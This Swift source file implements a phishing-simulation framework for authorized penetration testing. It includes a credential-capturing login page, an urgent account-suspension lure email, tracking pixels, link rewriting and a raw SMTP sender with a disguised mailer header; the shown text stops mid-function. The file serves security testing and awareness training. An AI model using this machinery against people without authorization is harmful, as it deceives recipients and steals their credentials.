//
//  SocialEngineeringManager.swift
//  DonkTool
//
//  Social Engineering Framework for authorized penetration testing
//

import SwiftUI
import Foundation
import WebKit
import Combine
import Network

// MARK: - Legal Disclaimer
/*
 ⚠️ AUTHORIZED SECURITY TESTING ONLY ⚠️
 
 This module is designed for authorized penetration testing and security awareness training.
 
 REQUIREMENTS:
 • Written authorization from the organization
 • Signed penetration testing agreement
 • Compliance with local laws and regulations
 • Professional liability insurance
 
 PROHIBITED USES:
 • Unauthorized phishing attempts
 • Credential theft without permission
 • Targeting individuals without consent
 • Any malicious or illegal activities
 */

// MARK: - Social Engineering Data Models

struct PhishingCampaign: Identifiable, Codable, Hashable {
    let id = UUID()
    var name: String
    var description: String
    var targetOrganization: String
    var status: CampaignStatus
    var createdAt: Date
    var launchedAt: Date?
    var completedAt: Date?
    var targets: [PhishingTarget]
    var emailTemplate: EmailTemplate
    var landingPage: LandingPageTemplate
    var metrics: CampaignMetrics
    var settings: CampaignSettings
    
    func hash(into hasher: inout Hasher) {
        hasher.combine(id)
    }
    
    static func == (lhs: PhishingCampaign, rhs: PhishingCampaign) -> Bool {
        return lhs.id == rhs.id
    }
    
    enum CampaignStatus: String, Codable, CaseIterable {
        case draft = "Draft"
        case ready = "Ready"
        case active = "Active"
        case paused = "Paused"
        case completed = "Completed"
        
        var color: Color {
            switch self {
            case .draft: return .gray
            case .ready: return .blue
            case .active: return .green
            case .paused: return .orange
            case .completed: return .purple
            }
        }
        
        var icon: String {
            switch self {
            case .draft: return "doc.text"
            case .ready: return "checkmark.circle"
            case .active: return "play.circle.fill"
            case .paused: return "pause.circle.fill"
            case .completed: return "checkmark.seal.fill"
            }
        }
    }
}

struct PhishingTarget: Identifiable, Codable {
    let id = UUID()
    var email: String
    var firstName: String
    var lastName: String
    var department: String?
    var position: String?
    var customFields: [String: String]
    var status: TargetStatus
    var emailSentAt: Date?
    var emailOpenedAt: Date?
    var linkClickedAt: Date?
    var credentialsSubmittedAt: Date?
    var reportedAsPhishingAt: Date?
    var interactions: [TargetInteraction]
    
    enum TargetStatus: String, Codable, CaseIterable {
        case pending = "Pending"
        case sent = "Sent"
        case opened = "Opened"
        case clicked = "Clicked"
        case submitted = "Submitted"
        case reported = "Reported"
        case bounced = "Bounced"
        case failed = "Failed"
        
        var color: Color {
            switch self {
            case .pending: return .gray
            case .sent: return .blue
            case .opened: return .cyan
            case .clicked: return .orange
            case .submitted: return .red
            case .reported: return .green
            case .bounced: return .yellow
            case .failed: return .red
            }
        }
    }
}

struct TargetInteraction: Identifiable, Codable {
    let id = UUID()
    let timestamp: Date
    let action: InteractionType
    let ipAddress: String?
    let userAgent: String?
    let location: String?
    let details: [String: String]
    
    enum InteractionType: String, Codable {
        case emailSent = "Email Sent"
        case emailOpened = "Email Opened"
        case linkClicked = "Link Clicked"
        case pageVisited = "Landing Page Visited"
        case credentialsEntered = "Credentials Entered"
        case attachmentOpened = "Attachment Opened"
        case reported = "Reported as Phishing"
    }
}

struct EmailTemplate: Identifiable, Codable, Hashable {
    let id = UUID()
    var name: String
    var subject: String
    var senderName: String
    var senderEmail: String
    var replyTo: String?
    var htmlContent: String
    var textContent: String
    var attachments: [EmailAttachment]
    var trackingEnabled: Bool
    var category: TemplateCategory
    var difficulty: TemplateDifficulty
    var tags: [String]
    
    func hash(into hasher: inout Hasher) {
        hasher.combine(id)
    }
    
    static func == (lhs: EmailTemplate, rhs: EmailTemplate) -> Bool {
        return lhs.id == rhs.id
    }
    
    enum TemplateCategory: String, Codable, CaseIterable {
        case corporate = "Corporate Communication"
        case it = "IT Department"
        case hr = "Human Resources"
        case financial = "Financial"
        case social = "Social Media"
        case delivery = "Package Delivery"
        case password = "Password Reset"
        case security = "Security Alert"
        case cloud = "Cloud Services"
        case software = "Software Updates"
        case custom = "Custom"
        case phishing = "phishing"
        
        var icon: String {
            switch self {
            case .corporate: return "building.2"
            case .it: return "desktopcomputer"
            case .hr: return "person.2"
            case .financial: return "dollarsign.circle"
            case .social: return "person.3"
            case .delivery: return "shippingbox"
            case .password: return "key"
            case .security: return "shield"
            case .cloud: return "cloud"
            case .software: return "gear.badge"
            case .custom: return "square.and.pencil"
            case .phishing: return "envelope.badge"
            }
        }
    }
    
    enum TemplateDifficulty: String, Codable, CaseIterable {
        case easy = "Easy"
        case medium = "Medium"
        case hard = "Hard"
        case expert = "Expert"
        
        var color: Color {
            switch self {
            case .easy: return .green
            case .medium: return .orange
            case .hard: return .red
            case .expert: return .purple
            }
        }
        
        var description: String {
            switch self {
            case .easy: return "Generic, obvious phishing indicators"
            case .medium: return "Some effort to appear legitimate"
            case .hard: return "Well-crafted, targeted content"
            case .expert: return "Highly sophisticated, spear-phishing"
            }
        }
    }
}

struct EmailAttachment: Identifiable, Codable {
    let id = UUID()
    var name: String
    var mimeType: String
    var size: Int
    var content: Data
    var isPayload: Bool
    var payloadType: PayloadType?
    
    enum PayloadType: String, Codable, CaseIterable {
        case macro = "Office Macro"
        case pdf = "PDF Exploit"
        case executable = "Executable"
        case script = "Script"
        case link = "Redirect Link"
    }
}

struct LandingPageTemplate: Identifiable, Codable {
    let id = UUID()
    var name: String
    var url: String
    var htmlContent: String
    var cssContent: String
    var jsContent: String
    var captureCredentials: Bool
    var redirectUrl: String?
    var customFields: [CustomFormField]
    var pageType: PageType
    
    enum PageType: String, Codable, CaseIterable {
        case login = "Login Page"
        case document = "Document Access"
        case survey = "Survey Form"
        case support = "Support Request"
        case custom = "Custom Form"
        
        var icon: String {
            switch self {
            case .login: return "person.circle"
            case .document: return "doc.text"
            case .survey: return "list.clipboard"
            case .support: return "questionmark.circle"
            case .custom: return "square.and.pencil"
            }
        }
    }
}

struct CustomFormField: Identifiable, Codable {
    let id = UUID()
    var name: String
    var label: String
    var type: FieldType
    var required: Bool
    var placeholder: String?
    
    enum FieldType: String, Codable, CaseIterable {
        case text = "Text"
        case email = "Email"
        case password = "Password"
        case phone = "Phone"
        case number = "Number"
        case date = "Date"
    }
}

struct CampaignMetrics: Codable {
    var emailsSent: Int = 0
    var emailsOpened: Int = 0
    var linksClicked: Int = 0
    var credentialsSubmitted: Int = 0
    var attachmentsOpened: Int = 0
    var reportsReceived: Int = 0
    
    var openRate: Double {
        guard emailsSent > 0 else { return 0 }
        return Double(emailsOpened) / Double(emailsSent) * 100
    }
    
    var clickRate: Double {
        guard emailsOpened > 0 else { return 0 }
        return Double(linksClicked) / Double(emailsOpened) * 100
    }
    
    var submissionRate: Double {
        guard linksClicked > 0 else { return 0 }
        return Double(credentialsSubmitted) / Double(linksClicked) * 100
    }
    
    var reportRate: Double {
        guard emailsSent > 0 else { return 0 }
        return Double(reportsReceived) / Double(emailsSent) * 100
    }
}

struct CampaignSettings: Codable {
    var sendingProfile: SendingProfile?
    var schedule: CampaignSchedule
    var tracking: TrackingOptions
    var notifications: CampaignNotificationSettings
}

struct SendingProfile: Identifiable, Codable {
    let id = UUID()
    var name: String
    var smtpHost: String
    var smtpPort: Int
    var username: String
    var password: String
    var useTLS: Bool
    var useStartTLS: Bool
    var sendRate: Int // emails per hour
}

struct CampaignSchedule: Codable {
    var startDate: Date?
    var endDate: Date?
    var sendingDays: [Weekday]
    var sendingHours: [Int] // 0-23
    var timezone: String
    
    enum Weekday: String, Codable, CaseIterable {
        case monday = "Monday"
        case tuesday = "Tuesday"
        case wednesday = "Wednesday"
        case thursday = "Thursday"
        case friday = "Friday"
        case saturday = "Saturday"
        case sunday = "Sunday"
        
        static func from(weekday: Int) -> Weekday {
            switch weekday {
            case 1: return .sunday
            case 2: return .monday
            case 3: return .tuesday
            case 4: return .wednesday
            case 5: return .thursday
            case 6: return .friday
            case 7: return .saturday
            default: return .monday
            }
        }
    }
}

struct TrackingOptions: Codable {
    var trackEmailOpens: Bool = true
    var trackLinkClicks: Bool = true
    var trackPageVisits: Bool = true
    var trackCredentials: Bool = true
    var trackGeolocation: Bool = false
    var trackUserAgent: Bool = true
    var anonymizeData: Bool = false
}

struct CampaignNotificationSettings: Codable {
    var emailNotifications: Bool = true
    var pushNotifications: Bool = false
    var notifyOnOpen: Bool = false
    var notifyOnClick: Bool = true
    var notifyOnSubmission: Bool = true
    var notifyOnReport: Bool = true
}

struct PersonalizedEmail {
    let subject: String
    let htmlContent: String
    let textContent: String
    let senderName: String
    let senderEmail: String
    let replyTo: String?
    let attachments: [EmailAttachment]
    let trackingId: String
    let headers: [String: String]
}

struct CampaignEndpoint {
    let campaign: PhishingCampaign
    let pixelHandler: (String, TrackingRequest) async -> Void
    let clickHandler: (String, String, TrackingRequest) async -> Void
    let landingPageHandler: (String, [String: String]?, TrackingRequest) async -> Void
}

struct CampaignAnalytics {
    var totalTargets: Int = 0
    var emailsSent: Int = 0
    var emailsOpened: Int = 0
    var linksClicked: Int = 0
    var credentialsSubmitted: Int = 0
    var reported: Int = 0
    var averageTimeToOpen: TimeInterval?
    var averageTimeToClick: TimeInterval?
    var averageTimeToSubmit: TimeInterval?
    var departmentBreakdown: [String: DepartmentMetrics] = [:]
    var overallRiskScore: Double = 0.0
}

struct DepartmentMetrics {
    var totalTargets: Int = 0
    var opened: Int = 0
    var clicked: Int = 0
    var submitted: Int = 0
    var reported: Int = 0
    
    var successRate: Double {
        guard totalTargets > 0 else { return 0 }
        return Double(submitted) / Double(totalTargets) * 100
    }
}

struct DefaultTemplates {
    static let emailTemplates: [EmailTemplate] = [
        EmailTemplate(
            name: "IT Security Alert",
            subject: "Urgent: Security Update Required",
            senderName: "IT Security Team",
            senderEmail: "security@company.com",
            replyTo: nil,
            htmlContent: """
            <html>
            <body>
                <h2>Security Alert</h2>
                <p>Dear {{firstName}},</p>
                <p>We have detected suspicious activity on your account. Please click the link below to verify your identity and secure your account.</p>
                <p><a href="{{link}}">Verify Account Now</a></p>
                <p>If you ignore this message, your account may be suspended.</p>
                <p>Best regards,<br>IT Security Team</p>
            </body>
            </html>
            """,
            textContent: "Security Alert: Please verify your account to prevent suspension.",
            attachments: [],
            trackingEnabled: true,
            category: .security,
            difficulty: .medium,
            tags: ["security", "urgent", "verification"]
        )
    ]
    
    static let landingPageTemplates: [LandingPageTemplate] = [
        LandingPageTemplate(
            name: "Corporate Login",
            url: "/login",
            htmlContent: """
            <!DOCTYPE html>
            <html>
            <head><title>Company Portal</title></head>
            <body>
                <h1>Sign In</h1>
                <form method="post">
                    <input type="email" name="email" placeholder="Email" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">Sign In</button>
                </form>
            </body>
            </html>
            """,
            cssContent: "body { font-family: Arial, sans-serif; }",
            jsContent: "",
            captureCredentials: true,
            redirectUrl: "https://company.com",
            customFields: [],
            pageType: .login
        )
    ]
}

// MARK: - Social Engineering Configuration

struct SocialEngineeringConfig {
    static var trackingDomain: String {
        UserDefaults.standard.string(forKey: "se_tracking_domain") ?? "tracking.donktool.com"
    }
    
    static var landingPageDomain: String {
        UserDefaults.standard.string(forKey: "se_landing_domain") ?? "secure.donktool.com"
    }
    
    static var useHTTPS: Bool {
        UserDefaults.standard.bool(forKey: "se_use_https")
    }
    
    static var trackingEndpointPixel: String {
        let scheme = useHTTPS ? "https" : "https" // Always use HTTPS for security
        return "\(scheme)://\(trackingDomain)/pixel"
    }
    
    static var trackingEndpointClick: String {
        let scheme = useHTTPS ? "https" : "https" // Always use HTTPS for security
        return "\(scheme)://\(trackingDomain)/click"
    }
    
    static func setTrackingDomain(_ domain: String) {
        UserDefaults.standard.set(domain, forKey: "se_tracking_domain")
    }
    
    static func setLandingPageDomain(_ domain: String) {
        UserDefaults.standard.set(domain, forKey: "se_landing_domain")
    }
}

// MARK: - Social Engineering Manager

@Observable
@MainActor
class SocialEngineeringManager {
    var campaigns: [PhishingCampaign] = []
    var emailTemplates: [EmailTemplate] = []
    var landingPageTemplates: [LandingPageTemplate] = []
    var sendingProfiles: [SendingProfile] = []
    
    private let dataStore = SecureSocialEngineeringDataStore()
    private let campaignEngine = CampaignExecutionEngine()
    private let analyticsEngine = PhishingAnalyticsEngine()
    private let emailValidator = EmailValidator()
    private let smtpManager = SMTPManager()
    
    // Campaign monitoring
    var campaignMonitor: CampaignMonitor?
    
    init() {
        // Load enhanced default templates
        self.emailTemplates = DefaultEmailTemplates.getAllTemplates()
        loadData()
        loadDefaultTemplates()
        
        // Initialize campaign monitor after self is fully initialized
        self.campaignMonitor = CampaignMonitor(socialManager: self)
    }
    
    func createCampaign(_ campaign: PhishingCampaign) {
        campaigns.append(campaign)
        saveCampaigns()
    }
    
    func updateCampaign(_ campaign: PhishingCampaign) {
        if let index = campaigns.firstIndex(where: { $0.id == campaign.id }) {
            campaigns[index] = campaign
            saveCampaigns()
        }
    }
    
    func deleteCampaign(_ campaignId: UUID) {
        campaigns.removeAll { $0.id == campaignId }
        saveCampaigns()
    }
    
    func launchCampaign(_ campaignId: UUID) async throws {
        guard let campaign = campaigns.first(where: { $0.id == campaignId }) else {
            throw CampaignError.campaignNotFound
        }
        
        guard campaign.status == .ready else {
            throw CampaignError.invalidStatus
        }
        
        // Validate campaign configuration
        try validateCampaign(campaign)
        
        var updatedCampaign = campaign
        updatedCampaign.status = .active
        updatedCampaign.launchedAt = Date()
        updateCampaign(updatedCampaign)
        
        // Start monitoring the campaign
        campaignMonitor?.startMonitoring(campaignId: campaignId)
        
        // Execute campaign using real SMTP
        try await campaignEngine.executeCampaign(updatedCampaign, smtpManager: smtpManager)
    }
    
    func pauseCampaign(_ campaignId: UUID) {
        guard var campaign = campaigns.first(where: { $0.id == campaignId }) else { return }
        campaign.status = .paused
        updateCampaign(campaign)
        campaignEngine.pauseCampaign(campaignId)
        campaignMonitor?.stopMonitoring(campaignId: campaignId)
    }
    
    func resumeCampaign(_ campaignId: UUID) async throws {
        guard var campaign = campaigns.first(where: { $0.id == campaignId }) else { return }
        campaign.status = .active
        updateCampaign(campaign)
        campaignMonitor?.startMonitoring(campaignId: campaignId)
        try await campaignEngine.resumeCampaign(campaign, smtpManager: smtpManager)
    }
    
    func getCampaignAnalytics(_ campaignId: UUID) -> CampaignAnalytics? {
        guard let campaign = campaigns.first(where: { $0.id == campaignId }) else { return nil }
        return analyticsEngine.generateAnalytics(for: campaign)
    }
    
    // MARK: - Campaign Monitoring
    
    func startCampaignMonitoring(_ campaignId: UUID) {
        campaignMonitor?.startMonitoring(campaignId: campaignId)
    }
    
    func stopCampaignMonitoring(_ campaignId: UUID) {
        campaignMonitor?.stopMonitoring(campaignId: campaignId)
    }
    
    func getRealTimeMetrics(for campaignId: UUID) -> RealTimeMetrics? {
        return campaignMonitor?.getRealTimeMetrics(for: campaignId)
    }
    
    func getLatestNotifications(limit: Int = 10) -> [CampaignNotification] {
        return campaignMonitor?.getLatestNotifications(limit: limit) ?? []
    }
    
    func generateProgressReport(for campaignId: UUID) -> ProgressReport? {
        return campaignMonitor?.generateProgressReport(for: campaignId)
    }
    
    // MARK: - Template Management
    
    func createEmailTemplate(_ template: EmailTemplate) {
        emailTemplates.append(template)
        saveEmailTemplates()
    }
    
    func createLandingPageTemplate(_ template: LandingPageTemplate) {
        landingPageTemplates.append(template)
        saveLandingPageTemplates()
    }
    
    func importTargetsFromCSV(_ csvData: Data) throws -> [PhishingTarget] {
        let csvString = String(data: csvData, encoding: .utf8) ?? ""
        return try CSVTargetParser.parse(csvString)
    }
    
    // MARK: - Validation
    
    private func validateCampaign(_ campaign: PhishingCampaign) throws {
        // Validate targets
        guard !campaign.targets.isEmpty else {
            throw CampaignError.noTargets
        }
        
        // Validate email addresses
        for target in campaign.targets {
            guard emailValidator.isValid(target.email) else {
                throw CampaignError.invalidTargetEmail(target.email)
            }
        }
        
        // Validate SMTP configuration
        guard let profile = campaign.settings.sendingProfile else {
            throw CampaignError.noSendingProfile
        }
        
        // Test SMTP connection
        try smtpManager.testConnection(profile: profile)
    }
    
    // MARK: - Data Persistence
    
    private func loadData() {
        campaigns = dataStore.loadCampaigns()
        emailTemplates = dataStore.loadEmailTemplates()
        landingPageTemplates = dataStore.loadLandingPageTemplates()
        sendingProfiles = dataStore.loadSendingProfiles()
    }
    
    private func saveCampaigns() {
        dataStore.saveCampaigns(campaigns)
    }
    
    private func saveEmailTemplates() {
        dataStore.saveEmailTemplates(emailTemplates)
    }
    
    private func saveLandingPageTemplates() {
        dataStore.saveLandingPageTemplates(landingPageTemplates)
    }
    
    private func loadDefaultTemplates() {
        if emailTemplates.isEmpty {
            emailTemplates = DefaultTemplates.emailTemplates
            saveEmailTemplates()
        }
        
        if landingPageTemplates.isEmpty {
            landingPageTemplates = DefaultTemplates.landingPageTemplates
            saveLandingPageTemplates()
        }
    }
}

// MARK: - Campaign Execution Engine

class CampaignExecutionEngine {
    private var activeCampaigns: [UUID: Task<Void, Error>] = [:]
    private let trackingServer = TrackingServer()
    
    func executeCampaign(_ campaign: PhishingCampaign, smtpManager: SMTPManager) async throws {
        let task = Task {
            try await runCampaign(campaign, smtpManager: smtpManager)
        }
        
        activeCampaigns[campaign.id] = task
        
        do {
            try await task.value
        } catch {
            activeCampaigns.removeValue(forKey: campaign.id)
            throw error
        }
    }
    
    func pauseCampaign(_ campaignId: UUID) {
        activeCampaigns[campaignId]?.cancel()
        activeCampaigns.removeValue(forKey: campaignId)
    }
    
    func resumeCampaign(_ campaign: PhishingCampaign, smtpManager: SMTPManager) async throws {
        try await executeCampaign(campaign, smtpManager: smtpManager)
    }
    
    private func runCampaign(_ campaign: PhishingCampaign, smtpManager: SMTPManager) async throws {
        // Set up tracking endpoints
        await trackingServer.setupCampaignEndpoints(campaign)
        
        // Process targets based on schedule
        let schedule = campaign.settings.schedule
        let sendRate = campaign.settings.sendingProfile?.sendRate ?? 50
        
        for target in campaign.targets where target.status == .pending {
            // Check if within scheduled time
            guard isWithinSchedule(schedule) else {
                try await Task.sleep(nanoseconds: 60_000_000_000) // Wait 1 minute
                continue
            }
            
            // Check for cancellation
            try Task.checkCancellation()
            
            // Send phishing email
            let trackingId = generateTrackingId(campaign: campaign, target: target)
            let personalizedEmail = personalizeEmail(
                template: campaign.emailTemplate,
                target: target,
                trackingId: trackingId,
                landingPageUrl: campaign.landingPage.url
            )
            
            do {
                try await smtpManager.sendEmail(
                    personalizedEmail,
                    to: target,
                    using: campaign.settings.sendingProfile!
                )
                
                // Update target status
                updateTargetStatus(target, status: .sent, in: campaign)
                
                // Log interaction
                trackingServer.logInteraction(
                    campaignId: campaign.id,
                    targetId: target.id,
                    action: .emailSent,
                    details: [:]
                )
                
                // Rate limiting
                let delaySeconds = 3600.0 / Double(sendRate)
                try await Task.sleep(nanoseconds: UInt64(delaySeconds * 1_000_000_000))
                
            } catch {
                updateTargetStatus(target, status: .failed, in: campaign)
                print("Failed to send email to \(target.email): \(error)")
            }
        }
        
        // Mark campaign as completed
        markCampaignCompleted(campaign)
    }
    
    private func isWithinSchedule(_ schedule: CampaignSchedule) -> Bool {
        let now = Date()
        let calendar = Calendar.current
        let hour = calendar.component(.hour, from: now)
        let weekday = calendar.component(.weekday, from: now)
        
        // Check if current hour is within sending hours
        guard schedule.sendingHours.contains(hour) else { return false }
        
        // Check if current day is in sending days
        let currentWeekday = CampaignSchedule.Weekday.from(weekday: weekday)
        return schedule.sendingDays.contains(currentWeekday)
    }
    
    private func generateTrackingId(campaign: PhishingCampaign, target: PhishingTarget) -> String {
        let data = "\(campaign.id.uuidString)-\(target.id.uuidString)".data(using: .utf8)!
        return data.base64EncodedString()
    }
    
    private func personalizeEmail(template: EmailTemplate, target: PhishingTarget, trackingId: String, landingPageUrl: String) -> PersonalizedEmail {
        var content = template.htmlContent
        
        // Replace placeholders
        content = content.replacingOccurrences(of: "{{firstName}}", with: target.firstName)
        content = content.replacingOccurrences(of: "{{lastName}}", with: target.lastName)
        content = content.replacingOccurrences(of: "{{email}}", with: target.email)
        content = content.replacingOccurrences(of: "{{department}}", with: target.department ?? "")
        content = content.replacingOccurrences(of: "{{position}}", with: target.position ?? "")
        
        // Replace link placeholder with tracking URL
        let trackingUrl = "\(SocialEngineeringConfig.trackingEndpointClick)/\(trackingId)?url=\(landingPageUrl.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed) ?? "")"
        content = content.replacingOccurrences(of: "{{link}}", with: trackingUrl)
        
        // Add tracking pixel
        if template.trackingEnabled {
            let trackingPixel = "<img src=\"\(SocialEngineeringConfig.trackingEndpointPixel)/\(trackingId)\" width=\"1\" height=\"1\" style=\"display:none;\" />"
            content = content.replacingOccurrences(of: "</body>", with: "\(trackingPixel)</body>")
        }
        
        // Update links with tracking
        content = addLinkTracking(content, trackingId: trackingId)
        
        return PersonalizedEmail(
            subject: personalizeText(template.subject, target: target),
            htmlContent: content,
            textContent: personalizeText(template.textContent, target: target),
            senderName: template.senderName,
            senderEmail: template.senderEmail,
            replyTo: template.replyTo,
            attachments: template.attachments,
            trackingId: trackingId,
            headers: [
                "X-Priority": "3",
                "X-Mailer": "Corporate Mail System",
                "List-Unsubscribe": "<mailto:unsubscribe@company.com>",
                "Precedence": "bulk"
            ]
        )
    }
    
    private func personalizeText(_ text: String, target: PhishingTarget) -> String {
        var result = text
        result = result.replacingOccurrences(of: "{{firstName}}", with: target.firstName)
        result = result.replacingOccurrences(of: "{{lastName}}", with: target.lastName)
        result = result.replacingOccurrences(of: "{{email}}", with: target.email)
        result = result.replacingOccurrences(of: "{{department}}", with: target.department ?? "")
        result = result.replacingOccurrences(of: "{{position}}", with: target.position ?? "")
        
        // Replace custom fields
        for (key, value) in target.customFields {
            result = result.replacingOccurrences(of: "{{\(key)}}", with: value)
        }
        
        return result
    }
    
    private func addLinkTracking(_ html: String, trackingId: String) -> String {
        // This is a simplified version - real implementation would use proper HTML parsing
        var result = html
        
        // Find all links and add tracking
        let pattern = #"href="(https?://[^"]+)""#
        if let regex = try? NSRegularExpression(pattern: pattern) {
            let matches = regex.matches(in: html, range: NSRange(html.startIndex..., in: html))
            
            for match in matches.reversed() {
                if let range = Range(match.range(at: 1), in: html) {
                    let originalUrl = String(html[range])
                    let trackedUrl = "\(SocialEngineeringConfig.trackingEndpointClick)/\(trackingId)?url=\(originalUrl.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed) ?? "")"
                    result.replaceSubrange(range, with: trackedUrl)
                }
            }
        }
        
        return result
    }
    
    private func updateTargetStatus(_ target: PhishingTarget, status: PhishingTarget.TargetStatus, in campaign: PhishingCampaign) {
        // Update target status in campaign
        if let index = campaign.targets.firstIndex(where: { $0.id == target.id }) {
            var updatedTarget = campaign.targets[index]
            updatedTarget.status = status
            
            // Update timestamps
            switch status {
            case .sent:
                updatedTarget.emailSentAt = Date()
            case .opened:
                updatedTarget.emailOpenedAt = Date()
            case .clicked:
                updatedTarget.linkClickedAt = Date()
            case .submitted:
                updatedTarget.credentialsSubmittedAt = Date()
            case .reported:
                updatedTarget.reportedAsPhishingAt = Date()
            default:
                break
            }
            
            // Save updated campaign
            // Note: In production, this would update the campaign in the data store
        }
    }
    
    private func markCampaignCompleted(_ campaign: PhishingCampaign) {
        var updatedCampaign = campaign
        updatedCampaign.status = .completed
        updatedCampaign.completedAt = Date()
        
        // Update campaign in data store
        // Note: In production, this would save the campaign
    }
}

// MARK: - SMTP Manager

class SMTPManager {
    private var activeConnections: [String: SMTPConnection] = [:]
    
    func testConnection(profile: SendingProfile) throws {
        guard !profile.smtpHost.isEmpty && !profile.username.isEmpty else {
            throw SMTPError.connectionFailed("Invalid SMTP configuration")
        }
        
        // Create test connection
        let connection = SMTPConnection(profile: profile)
        
        do {
            try connection.connect()
            try connection.authenticate()
            connection.disconnect()
        } catch {
            throw SMTPError.connectionFailed("Connection test failed: \(error.localizedDescription)")
        }
    }
    
    func sendEmail(_ email: PersonalizedEmail, to target: PhishingTarget, using profile: SendingProfile) async throws {
        let connectionKey = "\(profile.smtpHost):\(profile.smtpPort)"
        
        // Get or create connection
        let connection: SMTPConnection
        if let existingConnection = activeConnections[connectionKey] {
            connection = existingConnection
        } else {
            connection = SMTPConnection(profile: profile)
            try connection.connect()
            try connection.authenticate()
            activeConnections[connectionKey] = connection
        }
        
        // Compose and send email
        let message = composeMessage(email: email, target: target, profile: profile)
        try await connection.sendMessage(message)
    }
    
    private func composeMessage(email: PersonalizedEmail, target: PhishingTarget, profile: SendingProfile) -> EmailMessage {
        var headers: [String: String] = [
            "From": "\(email.senderName) <\(email.senderEmail)>",
            "To": "\(target.firstName) \(target.lastName) <\(target.email)>",
            "Subject": email.subject,
            "Date": RFC2822DateFormatter.string(from: Date()),
            "Message-ID": "<\(UUID().uuidString)@\(profile.smtpHost)>",
            "MIME-Version": "1.0"
        ]
        
        // Add custom headers
        for (key, value) in email.headers {
            headers[key] = value
        }
        
        // Add reply-to if specified
        if let replyTo = email.replyTo {
            headers["Reply-To"] = replyTo
        }
        
        // Create multipart message if both HTML and text content exist
        let body: String
        if !email.htmlContent.isEmpty && !email.textContent.isEmpty {
            let boundary = "boundary_\(UUID().uuidString.replacingOccurrences(of: "-", with: ""))"
            headers["Content-Type"] = "multipart/alternative; boundary=\"\(boundary)\""
            
            body = """
            --\(boundary)
            Content-Type: text/plain; charset=UTF-8
            Content-Transfer-Encoding: 7bit
            
            \(email.textContent)
            
            --\(boundary)
            Content-Type: text/html; charset=UTF-8
            Content-Transfer-Encoding: 7bit
            
            \(email.htmlContent)
            
            --\(boundary)--
            """
        } else if !email.htmlContent.isEmpty {
            headers["Content-Type"] = "text/html; charset=UTF-8"
            body = email.htmlContent
        } else {
            headers["Content-Type"] = "text/plain; charset=UTF-8"
            body = email.textContent
        }
        
        return EmailMessage(headers: headers, body: body)
    }
    
    deinit {
        // Clean up connections
        for connection in activeConnections.values {
            connection.disconnect()
        }
    }
}

// MARK: - SMTP Connection and Message Classes

class SMTPConnection {
    private let profile: SendingProfile
    private var socket: CFSocket?
    private var inputStream: InputStream?
    private var outputStream: OutputStream?
    private var isConnected = false
    
    init(profile: SendingProfile) {
        self.profile = profile
    }
    
    func connect() throws {
        var readStream: Unmanaged<CFReadStream>?
        var writeStream: Unmanaged<CFWriteStream>?
        
        CFStreamCreatePairWithSocketToHost(
            kCFAllocatorDefault,
            profile.smtpHost as CFString,
            UInt32(profile.smtpPort),
            &readStream,
            &writeStream
        )
        
        guard let inputStream = readStream?.takeRetainedValue(),
              let outputStream = writeStream?.takeRetainedValue() else {
            throw SMTPError.connectionFailed("Failed to create streams")
        }
        
        self.inputStream = inputStream as InputStream
        self.outputStream = outputStream as OutputStream
        
        // Configure TLS if required
        if profile.useTLS {
            CFReadStreamSetProperty(inputStream, CFStreamPropertyKey(rawValue: kCFStreamPropertySocketSecurityLevel), kCFStreamSocketSecurityLevelNegotiatedSSL)
            CFWriteStreamSetProperty(outputStream, CFStreamPropertyKey(rawValue: kCFStreamPropertySocketSecurityLevel), kCFStreamSocketSecurityLevelNegotiatedSSL)
        }
        
        self.inputStream?.open()
        self.outputStream?.open()
        
        // Wait for connection
        try waitForResponse(expectedCode: "220")
        
        // Send EHLO/HELO
        try sendCommand("EHLO \(profile.smtpHost)")
        try waitForResponse(expectedCode: "250")
        
        // Start TLS if required
        if profile.useStartTLS {
            try sendCommand("STARTTLS")
            try waitForResponse(expectedCode: "220")
            
            // Upgrade to TLS
            CFReadStreamSetProperty(self.inputStream! as CFReadStream, CFStreamPropertyKey(rawValue: kCFStreamPropertySocketSecurityLevel), kCFStreamSocketSecurityLevelNegotiatedSSL)
            CFWriteStreamSetProperty(self.outputStream! as CFWriteStream, CFStreamPropertyKey(rawValue: kCFStreamPropertySocketSecurityLevel), kCFStreamSocketSecurityLevelNegotiatedSSL)
            
            // Send EHLO again after TLS
            try sendCommand("EHLO \(profile.smtpHost)")
            try waitForResponse(expectedCode: "250")
        }
        
        isConnected = true
    }
    
    func authenticate() throws {
        guard isConnected else {
            throw SMTPError.connectionFailed("Not connected")
        }
        
        // AUTH LOGIN
        try sendCommand("AUTH LOGIN")
        try waitForResponse(expectedCode: "334")
        
        // Send username (base64 encoded)
        let usernameData = profile.username.data(using: .utf8)!
        let encodedUsername = usernameData.base64EncodedString()
        try sendCommand(encodedUsername)
        try waitForResponse(expectedCode: "334")
        
        // Send password (base64 encoded)
        let passwordData = profile.password.data(using: .utf8)!
        let encodedPassword = passwordData.base64EncodedString()
        try sendCommand(encodedPassword)
        try waitForResponse(expectedCode: "235")
    }
    
    func sendMessage(_ message: EmailMessage) async throws {
        guard isConnected else {
            throw SMTPError.connectionFailed("Not connected")
        }
        
        // MAIL FROM
        try sendCommand("MAIL FROM:<\(message.senderEmail)>")
        try waitForResponse(expectedCode: "250")
        
        // RCPT TO
        try sendCommand("RCPT TO:<\(message.recipientEmail)>")
        try waitForResponse(expectedCode: "250")
        
        // DATA command
        try sendCommand("DATA")
        try waitForResponse(expectedCode: "354")
        
        // Send headers and body
        let fullMessage = message.serialize()
        try sendData(fullMessage + "\r\n.")
        try waitForResponse(expectedCode: "250")
    }
    
    func disconnect() {
        if isConnected {
            try? sendCommand("QUIT")
            try? waitForResponse(expectedCode: "221")
        }
        
        inputStream?.close()
        outputStream?.close()
        inputStream = nil
        outputStream = nil
        isConnected = false
    }
    
    private func sendCommand(_ command: String) throws {
        let data = (command + "\r\n").data(using: .utf8)!
        try sendData(String(data: data, encoding: .utf8)!)
    }
    
    private func sendData(_ data: String) throws {
        guard let outputStream = outputStream else {
            throw SMTPError.connectionFailed("Output stream not available")
        }
        
        let bytes = Array(data.data(using: .utf8)!)
        let result = outputStream.write(bytes, maxLength: bytes.count)
        
        if result < 0 {
            throw SMTPError.sendFailed("Failed to write data")
        }
    }
    
    private func waitForResponse(expectedCode: String) throws {
        guard let inputStream = inputStream else {
            throw SMTPError.connectionFailed("Input stream not available")
        }
        
